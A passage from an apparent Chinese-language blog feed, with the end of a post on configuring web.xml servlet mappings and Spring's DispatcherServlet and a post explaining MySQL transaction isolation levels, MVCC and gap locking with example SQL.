title="&lt;servlet-mapping&gt;"></a>&lt;servlet-mapping&gt;</h5><p>&lt;servlet-mapping&gt;含有&lt;servlet-name&gt;和&lt;url-pattern&gt;</p><p>&lt;servlet-name&gt;：Servlet的名字，唯一性和一致性，与&lt;servlet&gt;元素中声明的名字一致。<br>&lt;url-pattern&gt;：指定相对于Servlet的URL的路径。该路径相对于web应用程序上下文的根路径。&lt;servlet-mapping&gt;将URL模式映射到某个Servlet，即该Servlet处理的URL。</p><h5 id="加载Servlet的过程"><a href="#加载Servlet的过程" class="headerlink" title="加载Servlet的过程"></a><strong>加载Servlet的过程</strong></h5><p>容器的Context对象对请求路径(URL)做出处理，去掉请求URL的上下文路径后，按路径映射规则和Servlet映射路径（&lt;url- pattern&gt;）做匹配，如果匹配成功，则调用这个Servlet处理请求。 </p><h4 id="DispatcherServlet在web-xml中的配置"><a href="#DispatcherServlet在web-xml中的配置" class="headerlink" title="DispatcherServlet在web.xml中的配置"></a>DispatcherServlet在web.xml中的配置</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Spring view分发器  对所有的请求都由business对应的类来控制转发 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>business<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>publishContext<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置Spring MVC，指定处理请求的Servlet，有两种方式：</p><ul><li>默认查找MVC配置文件的地址是：/WEB-INF/${servletName}-servlet.xml</li><li>可以通过配置修改MVC配置文件的位置，需要在配置DispatcherServlet时指定MVC配置文件的位置。</li></ul><p>我们在平台项目两个工程中分别使用了不同的配置方式，介绍如下：</p><ul><li><p>在business-client工程中按照默认方式查找MVC的配置文件，配置文件目录为： /WEB-INF/business-servlet.xml。工程目录结构如下所示：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211027093310.png" alt="image-20211027093305911"></p></li><li><p>在public-base-server工程中，通过第2种方式进行配置，把spring-servlet.xml放到src/main/resources/config/spring-servlet.xml，则需要在配置DispatcherServlet时指定&lt;init-param&gt;标签。具体代码如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>spring<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>publishContext<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:config/spring-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>工程目录结构如下：</p></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211027093610.png" alt="image-20211027093559203"></p><p>其中，classpath是web项目的类路径，可以理解为classes下面。因为无论这些配置文件放在哪，编译之后如果没有特殊情况的话都直接在classes下面。jar包的话虽然放在lib文件夹里，但实际上那些类可以直接引用，比如：com.test.ABC，仿佛也在classes下面一样。</p><p>在我们的工程里，经过验证，maven工程这两个路径经过编译后生成的文件都位于classes目录下，即这两个路径相当于类路径，在下面创建config文件夹（folder），然后创建自定义的xml配置文件即可。</p><p>classpath和classpath*区别：同名资源存在时，classpath只从第一个符合条件的classpath中加载资源，而classpath*会从所有的classpath中加载符合条件的资源。classpath<em>，需要遍历所有的classpath，效率肯定比不上classpath，因此在项目设计的初期就尽量规划好资源文件所在的路径，避免使用classpath\</em>来加载。</p><h4 id="ContextLoaderListener和DispatcherServlet初始化上下文关系和区别"><a href="#ContextLoaderListener和DispatcherServlet初始化上下文关系和区别" class="headerlink" title="ContextLoaderListener和DispatcherServlet初始化上下文关系和区别"></a>ContextLoaderListener和DispatcherServlet初始化上下文关系和区别</h4><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211027094236.png" alt="image-20211027094233818"></p><p>从上图可以看出，ContextLoaderListener初始化的上下文加载的Bean是对于整个应用程序共享的，一般如：DAO层、Service层Bean；DispatcherServlet初始化的上下文加载的Bean是只对Spring MVC有效的Bean，如：Controller、HandlerMapping、HandlerAdapter等，该初始化上下文只加载Web相关组件。</p><p>注意：用户可以配置多个DispatcherServlet来分别处理不同的url请求，每个DispatcherServlet上下文都对应一个自己的子Spring容器，他们都拥有相同的父Spring容器（业务层，持久（dao）bean所在的容器）。</p><h3 id="lt-welcome-file-list-gt-lt-welcome-file-list-gt"><a href="#lt-welcome-file-list-gt-lt-welcome-file-list-gt" class="headerlink" title="&lt;welcome-file-list&gt;&lt;/welcome-file-list&gt;"></a>&lt;welcome-file-list&gt;&lt;/welcome-file-list&gt;</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- welcome page --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.html<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&lt;welcome-file-list&gt;包含一个子元素&lt;welcome-file&gt;，&lt;welcome-file&gt;用来指定首页文件名称。&lt;welcome-file-list&gt;元素可以包含一个或多个&lt;welcome-file&gt;子元素。如果在第一个&lt;welcome-file&gt;元素中没有找到指定的文件，Web容器就会尝试显示第二个，以此类推。<br>————————————————<br>版权声明：本文为CSDN博主「黄玮鹏」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/believejava/article/details/43229361" target="_blank" rel="noopener">https://blog.csdn.net/believejava/article/details/43229361</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;web工程加载web-xml过程&quot;&gt;&lt;a href=&quot;#web工程加载web-xml过程&quot; class=&quot;headerlink&quot; title=&quot;web工程加载web.xml过程&quot;&gt;&lt;/a&gt;web工程加载web.xml过程&lt;/h2&gt;&lt;p&gt;当启动一个WEB项目时，容器
      
    
    </summary>
    
    
      <category term="Java笔试题" scheme="https://blog.kaluna.top/categories/Java%E7%AC%94%E8%AF%95%E9%A2%98/"/>
    
    
      <category term="练习" scheme="https://blog.kaluna.top/tags/%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>MySQL事务隔离级别和实现原理</title>
    <link href="https://blog.kaluna.top/2021/09/30/MySQL%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB%E5%92%8C%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/"/>
    <id>https://blog.kaluna.top/2021/09/30/MySQL%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB%E5%92%8C%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/</id>
    <published>2021-09-30T06:20:34.768Z</published>
    <updated>2021-10-29T08:49:42.762Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>经常提到数据库的事务，那你知道数据库还有事务隔离的说法吗，事务隔离还有隔离级别，那什么是事务隔离，隔离级别又是什么呢？本文就帮大家梳理一下。</p></blockquote><h1 id="ACID特性"><a href="#ACID特性" class="headerlink" title="ACID特性"></a>ACID特性</h1><p>ACID是衡量事务的四个特性：</p><ul><li>原子性（Atomicity，或称不可分割性）</li><li>一致性（Consistency）</li><li>隔离性（Isolation）</li><li>持久性（Durability）</li></ul><h2 id="MySQL-事务"><a href="#MySQL-事务" class="headerlink" title="MySQL 事务"></a><strong>MySQL 事务</strong></h2><p>本文所说的 MySQL 事务都是指在 InnoDB 引擎下，MyISAM 引擎是不支持事务的。</p><p>数据库事务指的是一组数据操作，事务内的操作要么就是全部成功，要么就是全部失败，什么都不做，其实不是没做，是可能做了一部分但是只要有一步失败，就要回滚所有操作，有点一不做二不休的意思。</p><p>假设一个网购付款的操作，用户付款后要涉及到订单状态更新、扣库存以及其他一系列动作，这就是一个事务，如果一切正常那就相安无事，一旦中间有某个环节异常，那整个事务就要回滚，总不能更新了订单状态但是不扣库存吧，这问题就大了。</p><p>事务具有原子性（Atomicity）、一致性（Consistency）、隔离性（Isolation）、持久性（Durability）四个特性，简称 ACID，缺一不可。</p><h1 id="原子性"><a href="#原子性" class="headerlink" title="原子性"></a>原子性</h1><p>原子性是指一个事务是一个不可分割的工作单位，其中的操作要么都做，要么都不做；如果事务中一个sql语句执行失败，则已执行的语句也必须回滚，数据库退回到事务前的状态。</p><h2 id="实现原理：undo-log"><a href="#实现原理：undo-log" class="headerlink" title="实现原理：undo log"></a>实现原理：undo log</h2><p>MySQL的日志有很多种，如二进制日志、错误日志、查询日志、慢查询日志等，此外InnoDB存储引擎还提供了两种事务日志：redo log(重做日志)和undo log(回滚日志)。其中redo log用于保证事务持久性；undo log则是事务原子性和隔离性实现的基础。</p><p>实现原子性的关键，是当事务回滚时能够撤销所有已经成功执行的sql语句。InnoDB实现回滚，靠的是undo log：当事务对数据库进行修改时，InnoDB会生成对应的undo log；如果事务执行失败或调用了rollback，导致事务需要回滚，便可以利用undo log中的信息将数据回滚到修改之前的样子。</p><p>undo log属于逻辑日志，它记录的是sql执行相关的信息。当发生回滚时，InnoDB会根据undo log的内容做与之前相反的工作：对于每个insert，回滚时会执行delete；对于每个delete，回滚时会执行insert；对于每个update，回滚时会执行一个相反的update，把数据改回去。</p><h1 id="隔离性"><a href="#隔离性" class="headerlink" title="隔离性"></a>隔离性</h1><h2 id="概念说明"><a href="#概念说明" class="headerlink" title="概念说明"></a><strong>概念说明</strong></h2><p>以下几个概念是事务隔离级别要实际解决的问题，所以需要搞清楚都是什么意思。</p><p><strong>脏读</strong></p><p>脏读指的是读到了其他事务未提交的数据，未提交意味着这些数据可能会回滚，也就是可能最终不会存到数据库中，也就是不存在的数据。读到了并一定最终存在的数据，这就是脏读。</p><p><strong>可重复读</strong></p><p>可重复读指的是在一个事务内，最开始读到的数据和事务结束前的任意时刻读到的同一批数据都是一致的。通常针对数据<strong>更新（UPDATE）</strong>操作。</p><p><strong>不可重复读</strong></p><p>对比可重复读，不可重复读指的是在同一事务内，不同的时刻读到的同一批数据可能是不一样的，可能会受到其他事务的影响，比如其他事务改了这批数据并提交了。通常针对数据<strong>更新（UPDATE）</strong>操作。</p><p><strong>幻读</strong></p><p>幻读是针对数据<strong>插入（INSERT）</strong>操作来说的。假设事务A对某些行的内容作了更改，但是还未提交，此时事务B插入了与事务A更改前的记录相同的记录行，并且在事务A提交之前先提交了，而这时，在事务A中查询，会发现好像刚刚的更改对于某些数据未起作用，但其实是事务B刚插入进来的，让用户感觉很魔幻，感觉出现了幻觉，这就叫幻读。</p><h2 id="事务隔离级别"><a href="#事务隔离级别" class="headerlink" title="事务隔离级别"></a><strong>事务隔离级别</strong></h2><p>SQL 标准定义了四种隔离级别，MySQL 全都支持。这四种隔离级别分别是：</p><ol><li>读未提交（READ UNCOMMITTED）</li><li>读提交 （READ COMMITTED）</li><li>可重复读 （REPEATABLE READ）</li><li>串行化 （SERIALIZABLE）</li></ol><p>从上往下，隔离强度逐渐增强，性能逐渐变差。采用哪种隔离级别要根据系统需求权衡决定，其中，<strong>可重复读</strong>是 MySQL 的默认级别。</p><p>事务隔离其实就是为了解决上面提到的脏读、不可重复读、幻读这几个问题，下面展示了 4 种隔离级别对这三个问题的解决程度。</p><p><img src="https://pic4.zhimg.com/80/v2-2e1a7203478165890e2d09f36cb39857_720w.jpg" alt="img"></p><p>只有串行化的隔离级别解决了全部这 3 个问题，其他的 3 个隔离级别都有缺陷。</p><h2 id="一探究竟"><a href="#一探究竟" class="headerlink" title="一探究竟"></a><strong>一探究竟</strong></h2><p>下面，我们来一一分析这 4 种隔离级别到底是怎么个意思。</p><p><strong>如何设置隔离级别</strong></p><p>我们可以通过以下语句查看当前数据库的隔离级别，通过下面语句可以看出我使用的 MySQL 的隔离级别是 REPEATABLE-READ，也就是可重复读，这也是 MySQL 的默认级别。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 查看事务隔离级别 5.7.20 之后</span><br><span class="line">show variables like &#39;transaction_isolation&#39;;</span><br><span class="line">SELECT @@transaction_isolation</span><br><span class="line"></span><br><span class="line"># 5.7.20 之后</span><br><span class="line">SELECT @@tx_isolation</span><br><span class="line">show variables like &#39;tx_isolation&#39;</span><br><span class="line"></span><br><span class="line">+---------------+-----------------+</span><br><span class="line">| Variable_name | Value           |</span><br><span class="line">+---------------+-----------------+</span><br><span class="line">| tx_isolation  | REPEATABLE-READ |</span><br><span class="line">+---------------+-----------------+</span><br></pre></td></tr></table></figure><p>稍后，我们要修改数据库的隔离级别，所以先了解一下具体的修改方式。</p><p>修改隔离级别的语句是：set [作用域] transaction isolation level [事务隔离级别]，<br>SET [SESSION | GLOBAL] TRANSACTION ISOLATION LEVEL {READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE}。</p><p>其中作用于可以是 SESSION 或者 GLOBAL，GLOBAL 是全局的，而 SESSION 只针对当前回话窗口。隔离级别是 {READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE} 这四种，不区分大小写。</p><p>比如下面这个语句的意思是设置全局隔离级别为读提交级别。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set global transaction isolation level read committed;</span><br></pre></td></tr></table></figure><p><strong>MySQL 中执行事务</strong></p><p>事务的执行过程如下，以 begin 或者 start transaction 开始，然后执行一系列操作，最后要执行 commit 操作，事务才算结束。当然，如果进行回滚操作(rollback)，事务也会结束。</p><p><img src="https://pic2.zhimg.com/80/v2-878a1a7f09b0135c7f72faa4c9670aed_720w.jpg" alt="img"></p><p>需要注意的是，begin 命令并不代表事务的开始，事务开始于 begin 命令之后的第一条语句执行的时候。例如下面示例中，select * from xxx 才是事务的开始，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">begin;</span><br><span class="line">select * from xxx; </span><br><span class="line">commit; -- 或者 rollback;</span><br></pre></td></tr></table></figure><p>另外，通过以下语句可以查询当前有多少事务正在运行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from information_schema.innodb_trx;</span><br></pre></td></tr></table></figure><p><strong>好了，重点来了，开始分析这几个隔离级别了。</strong></p><p>接下来我会用一张表来做一下验证，表结构简单如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;user&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;name&#96; varchar(30) DEFAULT NULL,</span><br><span class="line">  &#96;age&#96; tinyint(4) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB AUTO_INCREMENT&#x3D;2 DEFAULT CHARSET&#x3D;utf8</span><br></pre></td></tr></table></figure><p>初始只有一条记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM user;</span><br><span class="line">+----+-----------------+------+</span><br><span class="line">| id | name            | age  |</span><br><span class="line">+----+-----------------+------+</span><br><span class="line">|  1 | 古时的风筝        |    1 |</span><br><span class="line">+----+-----------------+------+</span><br></pre></td></tr></table></figure><p><strong>读未提交</strong></p><p>MySQL 事务隔离其实是依靠锁来实现的，加锁自然会带来性能的损失。而读未提交隔离级别是不加锁的，所以它的性能是最好的，没有加锁、解锁带来的性能开销。但有利就有弊，这基本上就相当于裸奔啊，所以它连脏读的问题都没办法解决。</p><p>任何事务对数据的修改都会第一时间暴露给其他事务，即使事务还没有提交。</p><p>下面来做个简单实验验证一下，首先设置全局隔离级别为读未提交。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global transaction isolation level read uncommitted;</span><br></pre></td></tr></table></figure><p>设置完成后，只对之后新起的 session 才起作用，对已经启动 session 无效。如果用 shell 客户端那就要重新连接 MySQL，如果用 Navicat 那就要创建新的查询窗口。</p><p>启动两个事务，分别为事务A和事务B，在事务A中使用 update 语句，修改 age 的值为10，初始是1 ，在执行完 update 语句之后，在事务B中查询 user 表，会看到 age 的值已经是 10 了，这时候事务A还没有提交，而此时事务B有可能拿着已经修改过的 age=10 去进行其他操作了。在事务B进行操作的过程中，很有可能事务A由于某些原因，进行了事务回滚操作，那其实事务B得到的就是脏数据了，拿着脏数据去进行其他的计算，那结果肯定也是有问题的。</p><p>顺着时间轴往表示两事务中操作的执行顺序，重点看图中 age 字段的值。</p><p><img src="https://pic4.zhimg.com/80/v2-77225da0805e43183c076c24f270e75b_720w.jpg" alt="img"></p><p>读未提交，其实就是可以读到其他事务未提交的数据，但没有办法保证你读到的数据最终一定是提交后的数据，如果中间发生回滚，那就会出现脏数据问题，读未提交没办法解决脏数据问题。更别提可重复读和幻读了，想都不要想。</p><p><strong>读提交</strong></p><p>既然读未提交没办法解决脏数据问题，那么就有了读提交。读提交就是一个事务只能读到其他事务已经提交过的数据，也就是其他事务调用 commit 命令之后的数据。那脏数据问题迎刃而解了。</p><p>读提交事务隔离级别是大多数流行数据库的默认事务隔离界别，比如 Oracle，但是不是 MySQL 的默认隔离界别。</p><p>我们继续来做一下验证，首先把事务隔离级别改为读提交级别。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global transaction isolation level read committed;</span><br></pre></td></tr></table></figure><p>之后需要重新打开新的 session 窗口，也就是新的 shell 窗口才可以。</p><p>同样开启事务A和事务B两个事务，在事务A中使用 update 语句将 id=1 的记录行 age 字段改为 10。此时，在事务B中使用 select 语句进行查询，我们发现在事务A提交之前，事务B中查询到的记录 age 一直是1，直到事务A提交，此时在事务B中 select 查询，发现 age 的值已经是 10 了。</p><p>这就出现了一个问题，在同一事务中(本例中的事务B)，事务的不同时刻同样的查询条件，查询出来的记录内容是不一样的，事务A的提交影响了事务B的查询结果，这就是不可重复读，也就是读提交隔离级别。</p><p><img src="https://pic1.zhimg.com/80/v2-90289243339a900aaf3f87d9c9930258_720w.jpg" alt="img"></p><p>每个 select 语句都有自己的一份快照，而不是一个事务一份，所以在不同的时刻，查询出来的数据可能是不一致的。</p><p>读提交解决了脏读的问题，但是无法做到可重复读，也没办法解决幻读。</p><p><strong>可重复读</strong></p><p>可重复是对比不可重复而言的，上面说不可重复读是指同一事物不同时刻读到的数据值可能不一致。而可重复读是指，事务不会读到其他事务对已有数据的修改，及时其他事务已提交，也就是说，事务开始时读到的已有数据是什么，在事务提交前的任意时刻，这些数据的值都是一样的。但是，对于其他事务新插入的数据是可以读到的，这也就引发了幻读问题。</p><p>同样的，需改全局隔离级别为可重复读级别。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global transaction isolation level repeatable read;</span><br></pre></td></tr></table></figure><p>在这个隔离级别下，启动两个事务，两个事务同时开启。</p><p>首先看一下可重复读的效果，事务A启动后修改了数据，并且在事务B之前提交，事务B在事务开始和事务A提交之后两个时间节点都读取的数据相同，已经可以看出可重复读的效果。</p><p><img src="https://pic1.zhimg.com/80/v2-85fd2da20ae7cf219bf55d8b81f8bd94_720w.jpg" alt="img"></p><p>可重复读做到了，这只是针对已有行的更改操作有效，但是对于新插入的行记录，就没这么幸运了，幻读就这么产生了。我们看一下这个过程：</p><p>事务A开始后，执行 update 操作，将 age = 1 的记录的 name 改为“风筝2号”；</p><p>事务B开始后，在事务执行完 update 后，执行 insert 操作，插入记录 age =1，name = 古时的风筝，这和事务A修改的那条记录值相同，然后提交。</p><p>事务B提交后，事务A中执行 select，查询 age=1 的数据，这时，会发现多了一行，并且发现还有一条 name = 古时的风筝，age = 1 的记录，这其实就是事务B刚刚插入的，这就是幻读。</p><p><img src="https://pic2.zhimg.com/80/v2-457f695ba253674e7a998297660c1a01_720w.jpg" alt="img"></p><p><strong>要说明的是，当你在 MySQL 中测试幻读的时候，并不会出现上图的结果，幻读并没有发生，MySQL 的可重复读隔离级别其实解决了幻读问题，这会在后面的内容说明</strong></p><p><strong>串行化</strong></p><p>串行化是4种事务隔离级别中隔离效果最好的，解决了脏读、可重复读、幻读的问题，但是效果最差，它将事务的执行变为顺序执行，与其他三个隔离级别相比，它就相当于单线程，后一个事务的执行必须等待前一个事务结束。</p><h2 id="MySQL-中是如何实现事务隔离的"><a href="#MySQL-中是如何实现事务隔离的" class="headerlink" title="MySQL 中是如何实现事务隔离的"></a><strong>MySQL 中是如何实现事务隔离的</strong></h2><p>首先说读未提交，它是性能最好，也可以说它是最野蛮的方式，因为它压根儿就不加锁，所以根本谈不上什么隔离效果，可以理解为没有隔离。</p><p>再来说串行化。读的时候加共享锁，也就是其他事务可以并发读，但是不能写。写的时候加排它锁，其他事务不能并发写也不能并发读。</p><p>最后说读提交和可重复读。这两种隔离级别是比较复杂的，既要允许一定的并发，又想要兼顾的解决问题。</p><p><strong>实现可重复读</strong></p><p>为了解决不可重复读，或者为了实现可重复读，MySQL 采用了 MVVC (多版本并发控制) 的方式。</p><p>我们在数据库表中看到的一行记录可能实际上有多个版本，每个版本的记录除了有数据本身外，还要有一个表示版本的字段，记为 row trx_id，而这个字段就是使其产生的事务的 id，事务 ID 记为 transaction id，它在事务开始的时候向事务系统申请，按时间先后顺序递增。</p><p><img src="https://pic1.zhimg.com/80/v2-114dd6691636883a92e7c1060210a014_720w.jpg" alt="img"></p><p>按照上面这张图理解，一行记录现在有 3 个版本，每一个版本都记录这使其产生的事务 ID，比如事务A的transaction id 是100，那么版本1的row trx_id 就是 100，同理版本2和版本3。</p><p>在上面介绍读提交和可重复读的时候都提到了一个词，叫做快照，学名叫做一致性视图，这也是可重复读和不可重复读的关键，可重复读是在事务开始的时候生成一个当前事务全局性的快照，而读提交则是每次执行语句的时候都重新生成一次快照。</p><p>对于一个快照来说，它能够读到那些版本数据，要遵循以下规则：</p><ol><li>当前事务内的更新，可以读到；</li><li>版本未提交，不能读到；</li><li>版本已提交，但是却在快照创建后提交的，不能读到；</li><li>版本已提交，且是在快照创建前提交的，可以读到；</li></ol><p>利用上面的规则，再返回去套用到读提交和可重复读的那两张图上就很清晰了。还是要强调，两者主要的区别就是在快照的创建上，可重复读仅在事务开始是创建一次，而读提交每次执行语句的时候都要重新创建一次。</p><p><strong>并发写问题</strong></p><p>存在这的情况，两个事务，对同一条数据做修改。最后结果应该是哪个事务的结果呢，肯定要是时间靠后的那个对不对。并且更新之前要先读数据，这里所说的读和上面说到的读不一样，更新之前的读叫做“当前读”，总是当前版本的数据，也就是多版本中最新一次提交的那版。</p><p>假设事务A执行 update 操作， update 的时候要对所修改的行加行锁，这个行锁会在提交之后才释放。而在事务A提交之前，事务B也想 update 这行数据，于是申请行锁，但是由于已经被事务A占有，事务B是申请不到的，此时，事务B就会一直处于等待状态，直到事务A提交，事务B才能继续执行，如果事务A的时间太长，那么事务B很有可能出现超时异常。如下图所示。</p><p><img src="https://pic1.zhimg.com/80/v2-da32a0f82e9585e39c655ac490c6f3d8_720w.jpg" alt="img"></p><p>加锁的过程要分有索引和无索引两种情况，比如下面这条语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set age&#x3D;11 where id &#x3D; 1</span><br></pre></td></tr></table></figure><p>id 是这张表的主键，是有索引的情况，那么 MySQL 直接就在索引数中找到了这行数据，然后干净利落的加上行锁就可以了。</p><p>而下面这条语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set age&#x3D;11 where age&#x3D;10</span><br></pre></td></tr></table></figure><p>表中并没有为 age 字段设置索引，所以， MySQL 无法直接定位到这行数据。那怎么办呢，当然也不是加表锁了。MySQL 会为这张表中所有行加行锁，没错，是所有行。但是呢，在加上行锁后，MySQL 会进行一遍过滤，发现不满足的行就释放锁，最终只留下符合条件的行。虽然最终只为符合条件的行加了锁，但是这一锁一释放的过程对性能也是影响极大的。所以，如果是大表的话，建议合理设计索引，如果真的出现这种情况，那很难保证并发度。</p><p><strong>解决幻读</strong></p><p>上面介绍可重复读的时候，那张图里标示着出现幻读的地方实际上在 MySQL 中并不会出现，MySQL 已经在可重复读隔离级别下解决了幻读的问题。</p><p>前面刚说了并发写问题的解决方式就是行锁，而解决幻读用的也是锁，叫做间隙锁，MySQL 把行锁和间隙锁合并在一起，解决了并发写和幻读的问题，这个锁叫做 Next-Key锁。</p><p>假设现在表中有两条记录，并且 age 字段已经添加了索引，两条记录 age 的值分别为 10 和 30。</p><p><img src="https://pic3.zhimg.com/80/v2-6a7c4b03297309813d57213a2a2d7366_720w.jpg" alt="img"></p><p>此时，在数据库中会为索引维护一套B+树，用来快速定位行记录。B+索引树是有序的，所以会把这张表的索引分割成几个区间。</p><p><img src="https://pic1.zhimg.com/80/v2-f07516da40274690e8ece9bc415eab88_720w.jpg" alt="img"></p><p>如图所示，分成了3 个区间，(负无穷,10]、(10,30]、(30,正无穷]，在这3个区间是可以加间隙锁的。</p><p>之后，我用下面的两个事务演示一下加锁过程。</p><p><img src="https://pic2.zhimg.com/80/v2-3ce9ac24fb6fdf3ff60d03e070136175_720w.jpg" alt="img"></p><p>在事务A提交之前，事务B的插入操作只能等待，这就是间隙锁起得作用。当事务A执行<code>update user set name=&#39;风筝2号’ where age = 10;</code> 的时候，由于条件 where age = 10 ，数据库不仅在 age =10 的行上添加了行锁，而且在这条记录的两边，也就是(负无穷,10]、(10,30]这两个区间加了间隙锁，从而导致事务B插入操作无法完成，只能等待事务A提交。不仅插入 age = 10 的记录需要等待事务A提交，age&lt;10、10&lt;age&lt;30 的记录页无法完成，而大于等于30的记录则不受影响，这足以解决幻读问题了。</p><p>这是有索引的情况，如果 age 不是索引列，那么数据库会为整个表加上间隙锁。所以，如果是没有索引的话，不管 age 是否大于等于30，都要等待事务A提交才可以成功插入。</p><h2 id="总结"><a href="#总结" class="headerlink" 